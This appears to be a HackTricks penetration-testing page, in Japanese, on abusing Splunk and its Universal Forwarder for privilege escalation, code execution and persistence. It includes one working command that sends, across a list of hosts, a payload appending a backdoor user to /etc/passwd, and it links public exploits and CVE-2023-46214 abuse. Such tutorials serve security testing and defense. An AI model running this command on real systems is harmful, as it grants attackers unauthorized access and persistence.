# Splunk LPE and Persistence

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、 [telegramグループ](https://t.me/peass) に参加するか、 **Twitter** 🐦 で **@carlospolopm** をフォローする。
* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する。

</details>

マシンを **内部** または **外部** で **列挙** しているときに、（ポート8090で） **Splunkが実行されている**ことがわかった場合、もし **有効な資格情報**を知っている幸運があれば、Splunkサービスを **悪用** して、Splunkを実行しているユーザーとして **シェルを実行** することができます。rootで実行されている場合は、特権をrootに昇格させることができます。

また、すでにrootであり、Splunkサービスが **localhost以外でのみリスニングしていない** 場合、Splunkサービスから **パスワードファイルを盗み**、そのパスワードを **クラック** するか、新しい資格情報を追加することができます。そしてホスト上で持続性を維持します。

最初の画像では、SplunkdのWebページがどのように見えるかが示されています。



## Splunk Universal Forwarder Agent Exploit Summary

**詳細については、[https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) の投稿を確認してください**

**Exploit概要:**
Splunk Universal Forwarder Agent（UF）を標的とするエクスプロイトは、エージェントのパスワードを持つ攻撃者がエージェントを実行しているシステムで任意のコードを実行できるようにし、ネットワーク全体を危険にさらす可能性があります。

**主なポイント:**
- UFエージェントは、受信接続やコードの信頼性を検証しないため、不正なコードの実行に脆弱です。
- 一般的なパスワード取得方法には、ネットワークディレクトリ、ファイル共有、内部文書での検索が含まれます。
- 成功した悪用により、侵害されたホストでのSYSTEMまたはrootレベルへのアクセス、データの持ち出し、さらなるネットワーク浸透が可能となります。

**Exploitの実行:**
1. 攻撃者がUFエージェントのパスワードを取得します。
2. Splunk APIを使用してコマンドやスクリプトをエージェントに送信します。
3. ファイルの抽出、ユーザーアカウントの操作、システムの侵害など、可能なアクションがあります。

**影響:**
- 各ホストでSYSTEM/rootレベルの権限を持つ完全なネットワーク侵害。
- 検出を回避するためのログの無効化の可能性。
- バックドアやランサムウェアのインストール。

**悪用のための例のコマンド:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
## Splunkの特権昇格と永続性

**使用可能な公開エクスプロイト:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

**Splunkクエリの悪用**

**詳細については、[https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)の投稿を確認してください**

**CVE-2023-46214**は、**`$SPLUNK_HOME/bin/scripts`**に任意のスクリプトをアップロードし、その後、検索クエリ**`|runshellscript script_name.sh`**を使用して、そこに保存されている**スクリプト**を**実行**できることを説明していました。
